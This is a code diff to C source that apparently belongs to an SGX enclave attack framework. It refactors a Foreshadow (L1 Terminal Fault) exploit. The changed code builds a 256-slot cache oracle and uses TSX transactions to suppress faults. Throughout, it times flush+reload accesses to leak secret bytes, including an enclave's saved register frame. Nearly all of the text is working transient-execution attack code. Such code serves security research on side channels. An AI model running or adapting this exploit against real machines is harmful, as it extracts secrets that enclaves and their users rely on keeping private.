@@ -30,60 +30,17 @@
 #include <sys/stat.h>
 #include <string.h>
 
-// +-------------+
-// |             |\
-// |             | > Positive margin slots
-// |             |/
-// +-------------+
-// |             |\
-// |             | > main oracle buffer
-// |             |/
-// +-------------+
-// |             |\
-// |             | > Negative margin slots
-// |             |/
-// +-------------+
-uint8_t *create_oracle_buffer( void )
-{
-    int i;
-	volatile void *slot_ptr;
-	uint8_t *oracle_buffer;
-        
-	if ( MAP_FAILED == ( oracle_buffer = mmap(	NULL,
-							TOTAL_ORACLE_PAGES * 0x1000,
-							PROT_EXEC | PROT_READ | PROT_WRITE,
-							MAP_PRIVATE | MAP_ANONYMOUS,
-							0,
-							0 ) ) )
-		return NULL;
-	
-	memset( oracle_buffer, 0x00, 0x1000 * TOTAL_ORACLE_PAGES );
-	oracle_buffer = (uint8_t *)( (uint64_t) oracle_buffer + 0x1000 * CEIL( ORACLE_NEGATIVE_MARGIN_SIZE, 0x1000 ) );
-
-    /* ensure all oracle pages are mapped in */
-    for ( i=0; i < NUM_SLOTS; i++)
-    {
-	    slot_ptr = SLOT_OFFSET( oracle_buffer, i );
-		reload( (void *) slot_ptr );
-		flush( (void *) slot_ptr );
-    }
-	
-	return oracle_buffer;
-}
-
-void destroy_oracle_buffer( uint8_t *oracle_buffer )
-{
-	oracle_buffer = (uint8_t *)( (uint64_t) oracle_buffer - 0x1000 * CEIL( ORACLE_NEGATIVE_MARGIN_SIZE, 0x1000 ) );
-	
-	munmap( oracle_buffer, TOTAL_ORACLE_PAGES );
-}
+#define SLOT_SIZE			        0x1000
+#define NUM_SLOTS			        256
+#define ORACLE_SIZE                 (SLOT_SIZE * NUM_SLOTS)
+#define SLOT_OFFSET(base, index)	((uint8_t *)((uint64_t) (base) + (index) * SLOT_SIZE))
 
 int fs_reload_threshold = 0x0;
 int fs_zero_retries = 0;
+int  __attribute__((aligned(0x1000))) fs_dummy;
+char __attribute__((aligned(0x1000))) fs_oracle[ORACLE_SIZE];
 
-int __attribute__((aligned(0x1000))) fs_dummy;
-
-void establish_fs_reload_threshold(void)
+void foreshadow_init(void)
 {
     unsigned long t1, t2;
     flush(&fs_dummy);
@@ -91,9 +48,12 @@ void establish_fs_reload_threshold(void)
     t2 = reload(&fs_dummy);
     fs_reload_threshold = t1-t2-60;
     info("cache hit/miss=%lu/%lu; reload threshold=%d", t2, t1, fs_reload_threshold);
+
+    /* ensure all oracle pages are mapped in */
+    memset(fs_oracle, 1, ORACLE_SIZE);
 }
 
-static inline int __attribute__((always_inline)) foreshadow_round(void *adrs, void *oracle)
+static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
 {
     void *slot_ptr;
     int i, fault_fired = 0;
@@ -111,17 +71,12 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs, vo
      */
     for (i=0; i < NUM_SLOTS; i++)
     {
-        slot_ptr = SLOT_OFFSET( oracle, i );
+        slot_ptr = SLOT_OFFSET( fs_oracle, i );
         flush( slot_ptr );
 
+        /* Use TSX transaction support for exception supression */
         if ( rtm_begin() == 0 )
-            transient_access(oracle, adrs, SLOT_SIZE);
-        #if FORESHADOW_DEBUG
-            else
-                fault_fired++;
-            ASSERT(fault_fired);
-            fault_fired = 0;
-        #endif
+            transient_access(fs_oracle, adrs, SLOT_SIZE);
 
         if (reload( slot_ptr ) < fs_reload_threshold)
             return i;
@@ -130,21 +85,21 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs, vo
     return 0;
 }
 
-int foreshadow(void *adrs, void *oracle)
+int foreshadow(void *adrs)
 {
     int j, rv = 0xff;
 
     if (!fs_reload_threshold) 
-        establish_fs_reload_threshold();
+        foreshadow_init();
 
     /* Be sceptic about 0x00 bytes to compensate for the bias */
-    for(j=0; !(rv = foreshadow_round(adrs, oracle)) &&
+    for(j=0; !(rv = foreshadow_round(adrs)) &&
              j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
 
     return rv;
 }
 
-int foreshadow_ssa(gprsgx_region_t *shadow_gprsgx, void* gprsgx_alias, void* oracle)
+int foreshadow_ssa(gprsgx_region_t *shadow_gprsgx, void* gprsgx_pt)
 {
     static int ssa_cur_byte = 0, ssa_zero_retries = 0;
     int j, secret;
@@ -152,7 +107,7 @@ int foreshadow_ssa(gprsgx_region_t *shadow_gprsgx, void* gprsgx_alias, void* ora
     /* fill in shadow SSA frame */
     for (j = ssa_cur_byte; j < sizeof(gprsgx_region_t); j++)
     {
-        secret = foreshadow(gprsgx_alias + j, oracle);
+        secret = foreshadow(gprsgx_pt + j);
 
         /* don't overwrite non-zero (correct) readings */
         if (!shadow_gprsgx->bytes[j])
